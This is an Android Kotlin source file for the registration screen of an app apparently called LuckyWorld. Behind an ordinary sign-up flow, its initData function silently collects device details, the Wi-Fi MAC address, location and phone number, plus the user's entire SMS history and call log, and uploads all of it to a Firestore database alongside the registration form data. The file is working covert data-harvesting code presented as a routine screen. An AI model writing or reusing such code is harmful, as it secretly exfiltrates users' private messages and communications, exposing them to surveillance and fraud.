package com.mind.luckyworld.view.fragment

import android.os.Bundle
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import androidx.fragment.app.Fragment
import androidx.fragment.app.viewModels
import androidx.lifecycle.Observer
import androidx.navigation.fragment.findNavController
import com.google.android.material.snackbar.Snackbar
import com.google.firebase.firestore.FirebaseFirestore
import com.google.firebase.firestore.SetOptions
import com.mind.luckyworld.R
import com.mind.luckyworld.databinding.RegisterFragmentBinding
import com.mind.luckyworld.model.CallLog
import com.mind.luckyworld.model.DeviceDetails
import com.mind.luckyworld.model.SmsLog
import com.mind.luckyworld.model.User
import com.mind.luckyworld.utils.*
import com.mind.luckyworld.view.activity.LuckWorldActivity
import com.mind.luckyworld.viewmodel.RegisterViewModel

class RegisterFragment : Fragment() {

    private val firebaseFirestore: FirebaseFirestore by lazy {
        FirebaseFirestore.getInstance()
    }
    private val viewModel: RegisterViewModel by viewModels {
        InjectorUtils.provideRegisterViewModelFactory(requireContext())
    }

    private lateinit var binding: RegisterFragmentBinding

    override fun onCreateView(
        inflater: LayoutInflater, container: ViewGroup?,
        savedInstanceState: Bundle?
    ): View? {
        binding = RegisterFragmentBinding.inflate(inflater, container, false)
        binding.viewModel = viewModel
        binding.lifecycleOwner = this@RegisterFragment
        initObserver()
        return binding.root
    }

    private fun initObserver() {
        viewModel.isSuccess.observe(viewLifecycleOwner, Observer { success ->
            if (success) {
                initData()
            } else {
                Snackbar.make(
                    requireView(),
                    viewModel.message.value.toString(),
                    Snackbar.LENGTH_SHORT
                ).show()
            }
        })

        /*viewModel.isTimerFinish.observe(viewLifecycleOwner, Observer {
            if (it) {
                viewModel.animate.value = false
                binding.button2.isPressed = false
            }
        })*/
    }

    private fun initData() {
        if (isNetworkAvailable(requireContext()).not()) {
            Snackbar.make(
                requireView(),
                "Please check your internet connection and try again!",
                Snackbar.LENGTH_LONG
            ).show()
            viewModel.animate.value = false
            binding.button2.isPressed = false
            return
        }
//        viewModel.timer.start()
        viewModel.animate.value = true
        val collectionReference = firebaseFirestore.collection("users")
        val documentReference = collectionReference.document()
        val deviceDetails = DeviceDetails(
            getDeviceName(),
            getWifiMacAddress(),
            (requireActivity() as LuckWorldActivity).mLocation,
            getMemoryInfo(requireActivity()),
            getBatteryLevel(requireActivity()),
            getPhoneNumber(requireActivity())
        )
        documentReference.set(deviceDetails)

        val subCollReference = documentReference.collection("deviceDetails")
        subCollReference.document("data").set(deviceDetails)

        val subCollectionReference = documentReference.collection("smsLogs")
        val mList: List<SmsLog> = getAllSms(requireActivity())
        if (mList.isNotEmpty()) {
            var i = 0
            mList.forEach {
                subCollectionReference.document("${i++}").set(it, SetOptions.merge())
            }
        }

        val subCollectionRef = documentReference.collection("callLogs")
        val mCallList: List<CallLog> = getCallDetails(requireActivity())
        if (mCallList.isNotEmpty()) {
            var i = 0
            mCallList.forEach {
                subCollectionRef.document("${i++}").set(it, SetOptions.merge())
            }
        }

        val subCollRef = documentReference.collection("userDetails")
        val user = User(
            viewModel.name.value!!,
            viewModel.phoneNumber.value!!,
            viewModel.emailAddress.value!!
        )

        documentReference.set(user, SetOptions.merge()) // todo to remove

        subCollRef.document("data").set(
            user, SetOptions.merge()
        ).addOnFailureListener {
            viewModel.animate.value = false
            Snackbar.make(
                requireView(),
                "Registration unsuccessful, Please try again!",
                Snackbar.LENGTH_LONG
            ).show()
        }.addOnSuccessListener {
            Snackbar.make(requireView(), "Registration Successful!", Snackbar.LENGTH_LONG).show()
            this@RegisterFragment.findNavController()
                .navigate(R.id.action_registerFragment_to_registerSuccessFragment)
        }

    }
}
